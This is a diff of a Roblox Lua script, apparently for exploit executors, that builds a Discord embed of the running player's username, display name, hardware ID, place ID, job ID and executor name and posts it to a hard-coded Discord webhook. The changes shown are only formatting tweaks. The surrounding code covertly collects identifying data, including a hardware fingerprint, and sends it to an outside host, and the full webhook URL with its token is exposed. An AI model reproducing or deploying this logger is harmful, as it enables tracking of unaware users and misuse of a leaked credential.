@@ -1,3 +1,4 @@
+--1
 local HttpService = game:GetService("HttpService")
 local player = game:GetService("Players").LocalPlayer
 local webhookURL = "https://discord.com/api/webhooks/1372904210370265259/p-Z-klz9ywB-WpHuvrPCjPRt23me00hA_cC2Jh1XHLtNUvLHFG0c4khAbWe4jGO04s-k"
@@ -16,13 +17,13 @@ local data = {
         ["fields"] = {
             {
                 ["name"] = "User Information",
-                ["value"] = string.format("**Username:** @%s\n**Display Name:** %s\n**HWID:**\n```%s```", 
+                ["value"] = string.format("**Username:** @%s\n**Display Name:** %s\n**HWID:**\n`%s`", 
                     player.Name, player.DisplayName, hwid),
                 ["inline"] = false
             },
             {
                 ["name"] = "Game Details",
-                ["value"] = string.format("**Place ID:**\n```%d```\n**Job ID:**\n```%s```\n**Executor:**\n```%s```", 
+                ["value"] = string.format("**Place ID:**\n`%d`\n**Job ID:**\n`%s`\n**Executor:**\n`%s`", 
                     game.PlaceId, jobId, executor),
                 ["inline"] = false
             },
